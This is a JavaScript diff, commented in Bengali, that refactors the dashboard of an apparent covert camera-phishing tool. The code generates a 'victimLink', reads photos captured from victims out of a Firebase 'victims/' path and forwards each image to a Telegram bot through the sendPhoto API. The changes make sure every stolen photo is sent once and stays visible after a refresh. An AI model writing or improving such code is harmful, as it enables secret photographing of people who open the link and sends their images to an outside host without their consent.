@@ -162,19 +162,19 @@ firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
 let currentId = localStorage.getItem("currentCamId") || null;
-
-// এই কী দিয়ে localStorage-এ ট্র্যাক রাখবো কোন ছবি পাঠানো হয়েছে
-const SENT_KEY = "sent_images_" + (currentId || "");
+const SENT_KEY = "sent_images_" + (currentId || ""); // প্রতি লিংকের জন্য আলাদা
 
 function getSentImages() {
   const saved = localStorage.getItem(SENT_KEY);
   return saved ? new Set(JSON.parse(saved)) : new Set();
 }
 
-function saveSentImage(base64) {
+function markAsSent(base64) {
   const sent = getSentImages();
-  sent.add(base64);
-  localStorage.setItem(SENT_KEY, JSON.stringify([...sent]));
+  if (!sent.has(base64)) {
+    sent.add(base64);
+    localStorage.setItem(SENT_KEY, JSON.stringify([...sent]));
+  }
 }
 
 if(currentId){
@@ -187,10 +187,13 @@ function generateLink(){
   currentId = Date.now().toString(36);
   localStorage.setItem("currentCamId", currentId);
   
-  // নতুন লিংক = নতুন কী, পুরাতন সেন্ট লিস্ট ক্লিয়ার
-  const newSentKey = "sent_images_" + currentId;
-  localStorage.removeItem(Object.keys(localStorage).find(k => k.startsWith("sent_images_") && k !== newSentKey));
-  
+  // পুরাতন সেন্ট লিস্ট ক্লিয়ার (শুধু এই ডোমেইনের)
+  Object.keys(localStorage).forEach(key => {
+    if (key.startsWith("sent_images_") && key !== "sent_images_" + currentId) {
+      localStorage.removeItem(key);
+    }
+  });
+
   const link = location.href.split('index.html')[0] + "view.html?id=" + currentId;
   document.getElementById("linkBox").style.display = "block";
   document.getElementById("victimLink").value = link;
@@ -217,7 +220,7 @@ async function sendToTelegram(base64){
   if (sent.has(base64)) return; // ইতিমধ্যে পাঠানো হয়েছে
 
   try{
-    saveSentImage(base64); // এখনই সেভ করি যাতে ডুপ্লিকেট না হয়
+    markAsSent(base64); // এখনই মার্ক করি
     const blob = await (await fetch(base64)).blob();
     const file = new File([blob], "photo.jpg", {type:"image/jpeg"});
     const form = new FormData();
@@ -226,7 +229,7 @@ async function sendToTelegram(base64){
     form.append('caption', `নতুন ছবি!\nলিংক: ${location.href.split('index.html')[0] + "view.html?id=" + currentId}`);
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:form});
   }catch(e){
-    console.error("Telegram send failed:", e);
+    console.error(e);
   }
 }
 
@@ -242,16 +245,16 @@ function downloadImage(imgSrc) {
 function loadPhotos(id){
   const ref = db.ref("victims/"+id);
   
-  ref.on("child_added", s=>{
+  ref.on("child_added", s => {
     const key = s.key;
     const data = s.val();
-    if(!data?.data) return;
+    if (!data?.data) return;
 
     const base64 = data.data;
-    const sent = getSentImages();
 
-    // যদি আগে পাঠানো না থাকে, তবেই কার্ড দেখাবে + টেলিগ্রামে পাঠাবে
-    if (!sent.has(base64)) {
+    // সবসময় কার্ড দেখাবে (রিফ্রেশেও থাকবে)
+    const existingCard = Array.from(document.querySelectorAll('.card img')).some(img => img.src === base64);
+    if (!existingCard) {
       document.getElementById("noimg").style.display = "none";
       const card = document.createElement("div");
       card.className = "card";
@@ -262,13 +265,13 @@ function loadPhotos(id){
         <div class="delete-btn" onclick="deletePhoto('${key}', this)" title="মুছে ফেলুন"><i class="fas fa-trash-alt"></i></div>
       `;
       document.getElementById("grid").appendChild(card);
-      
-      sendToTelegram(base64); // শুধু নতুন ছবি পাঠাবে
     }
+
+    // কিন্তু টেলিগ্রামে শুধু একবার পাঠাবে
+    sendToTelegram(base64);
   });
-  
-  // ১ ঘণ্টা পর ডেটা + localStorage থেকে ক্লিয়ার
-  setTimeout(()=>{ 
+
+  setTimeout(() => { 
     ref.off();
     ref.remove(); 
     localStorage.removeItem("currentCamId");
